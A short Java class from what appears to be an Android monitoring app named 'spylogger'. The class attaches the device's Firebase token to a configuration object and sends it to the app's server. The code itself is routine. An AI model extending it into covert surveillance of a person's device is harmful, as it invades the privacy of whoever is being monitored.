package com.gravatasufoca.spylogger.services;

import com.google.firebase.iid.FirebaseInstanceId;
import com.gravatasufoca.spylogger.helpers.TaskComplete;
import com.gravatasufoca.spylogger.vos.ConfiguracaoVO;

import retrofit2.Call;

/**
 * Created by bruno on 02/12/16.
 */

public class SendConfiguracaoService extends SendDataService<Boolean> {

    public SendConfiguracaoService(TaskComplete handler) {
        super(handler);
    }

    public void enviar(ConfiguracaoVO configuracaoVO){
        configuracaoVO.setChave(FirebaseInstanceId.getInstance().getToken());
        Call<Boolean> call=sendApi.enviarConfiguracao(configuracaoVO);
        call.enqueue(this);
    }

}
